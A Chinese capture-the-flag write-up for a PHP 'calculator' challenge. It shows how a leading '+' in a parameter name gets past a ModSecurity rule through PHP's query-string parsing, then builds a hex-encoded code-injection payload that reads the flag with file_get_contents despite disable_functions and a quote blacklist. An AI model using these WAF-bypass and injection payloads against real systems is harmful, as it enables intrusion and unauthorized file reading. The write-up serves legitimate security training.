# 简单的计算器

![1565768559842](.\1565768559842.png)

主要考点：php字符串解析函数绕过modsecurity

https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/

文章中介绍的是xxx_xxx类型参数，fuzz后可发现任意参数都存在解析问题

``` 
# php parse_test.php
{chr}foobar -> 20 ( )
{chr}foobar -> 26 (&)
{chr}foobar -> 2b (+)

foobar{chr} -> 00 ( )
foobar{chr} -> 26 (&)
foobar{chr} -> 3d (=)
```

利用fuzz出的字符进行测试，可发现只存在于参数首部，所以可以利用%20或者‘+’进行waf绕过，modsecurity规则：

``` 
SecRule ARGS:num "@rx ^[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*" "id:001,msg:'Hack',severity:ERROR,deny,status:403"
```

测试payload：+num=phpinfo()

![1565768741559](.\1565768741559.png)



第二层主要就是常规的函数字符绕过

设置了disable_function

``` 
passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,chdir,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,putenv,opendir,imap_open,mail,imap_mail,ini_set,apache_setenv,link,
```

留了file_get_contents()，所以利用该函数去读flag，源码中也存在过滤。

``` 
$blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','$'.'\\'];
	foreach ($blacklist as $blackitem) {
		if (preg_match('/' . $blackitem . '/m', $str)) {
			die("what are you want to do?");
		}
	}
```

过滤了单引号和双引号，可以利用hexdec和bin2hex来进行转换，用scandir来查询目录

``` 
hexdec(bin2hex('/')); -> 47
```



![1565769712443](.\1565769712443.png)

``` 
hexdec(bin2hex('/f1agg')); -> 52115961636711
```

所以阔以构造payload：

``` 
?+num=file_get_contents(hex2bin(dechex(52115961636711)))
```

来读flag（这里顺便收集一波姿势）

![1565769875362](.\1565769875362.png)



